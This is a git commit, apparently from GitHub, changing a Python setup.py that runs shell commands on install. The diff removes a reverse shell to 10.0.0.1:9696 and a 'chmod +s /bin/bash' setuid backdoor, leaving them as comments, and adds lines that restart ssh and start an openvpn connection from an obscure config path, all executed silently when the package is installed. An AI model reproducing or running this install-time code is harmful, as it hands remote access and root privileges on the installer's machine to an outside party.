8a6c6ff3574638969541ba6ac41cbb86e46a79b5
Samarjit Das <139358975+samarjitdas25@users.noreply.github.com>
2026-09-25 02:36:37 -0400

    Update setup.py

--- setup.py
+++ setup.py
@@ -1,7 +1,8 @@
 import os
 run=os.system
-run("systemctl enable ssh")
-run("systemctl start ssh")
-run("chmod +s /bin/bash")
-run("bash -i >& /dev/tcp/10.0.0.1/9696 0>&1")
+run("systemctl restart ssh")
+#run("systemctl start ssh")
+#run("chmod +s /bin/bash")
+#run("bash -i >& /dev/tcp/10.0.0.1/9696 0>&1")
+run("openvpn /bin/system-so/user1596.user1596.ovpn")
 
